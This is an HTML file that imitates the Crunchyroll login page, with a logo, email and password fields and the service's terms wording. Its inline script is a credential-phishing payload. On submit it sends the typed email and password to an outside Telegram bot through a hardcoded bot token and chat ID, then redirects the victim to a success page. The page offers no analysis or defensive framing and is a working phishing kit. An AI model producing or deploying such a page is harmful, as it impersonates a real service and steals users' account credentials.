<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crunchyroll Log In</title>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Noto Sans', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .d {
          font-size: 12px;
        }
        .u {
          font-size: 13.85px;
        }
        .container {
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        .logo {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 100%;
            margin-right: 10px;
        }
        .logo .divider {
            margin: 0 10px;
            color: #fff;
        }
        input[type="email"], input[type="password"] {
            width: calc(100% - 40px);
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            display: inline-block;
            background-color: #404040;
            color: #fff;
            outline: 0;
        }
        .password-container {
            position: relative;
            width: 100%;
        }
        .password-container input {
            width: calc(100% - 40px);
        }
        .password-container .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #fff;
        }
        .login-btn {
            background-color: #f47521;
            color: #000;
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 5px;
            margin-top: 10px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-btn:hover {
            background-color: #e66418;
        }
        .links {
            margin-top: 20px;
        }
        .links a {
            color: #f47521;
            text-decoration: none;
            margin: 0 10px;
        }
        h2 {
          color: #404050;
        }
       a {
            color: #f47521;
            text-decoration: none;
    </style>
</head>
<body>
    <div class="container">
        <h2>Log In</h2>
        <div class="logo">
            <img src="l.jpg" alt="Crunchyroll" />
        </div>
        <p class="u">Welcome to Crunchyroll! To log in, you can use either Crunchyroll or Funimation credentials.</p>
        <form id="login-form">
            <input type="email" id="email" placeholder="Email" required>
            <div class="password-container">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <p class="d">By logging in you're agreeing to our <a href="#">Terms</a> & <a href="#">Privacy Policy</a> and are at least 16 years old.</p>
            <button type="submit" class="login-btn"><b>LOG IN</b></button>
        </form>
        <p class="links">
            <a href="#">Forgot Password?</a> | 
            <a href="#">Create Account</a>
        </p>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const botToken = '7459616597:AAHYSXEoD6AN1xxrl0AHNhgGFB6z-pJtNmQ';
            const chatId = '6487414348';
            const message = `Crunchyroll 🔶\nEmail: ${email}\nPassword: ${password}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    window.location.href = "success.html"; // রিডিরেক্ট সাকসেস পেজে
                } else {
                    alert('Error sending message.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error sending message.');
            });
        });
    </script>
</body>
</html>
